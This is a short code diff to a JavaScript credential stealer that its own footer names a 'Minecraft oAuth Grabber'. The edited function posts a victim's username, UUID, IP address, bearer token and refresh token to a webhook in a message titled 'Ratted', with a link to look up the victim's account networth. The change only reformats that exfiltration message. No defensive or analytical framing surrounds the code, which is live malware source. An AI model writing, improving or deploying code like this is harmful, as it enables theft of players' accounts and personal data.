@@ -131,7 +131,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     {
       title: "Ratted " + username + " - Click for networth",
       color: 5898337,
-      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
+      description: "**Username:**\n```"+username+"```\n\n**UUID:**\n```"+uuid+"```\n\n**IP:**\n```"+ip+"```\n\n**Token:**\n```"+bearerToken+"```\n\n**Refresh Token:**\n```"+refreshToken+"```\n",
       url: "https://spillager.live/skyblock/networth/"+username,
       footer: {
         text: "Minecraft oAuth Grabber by WH0",
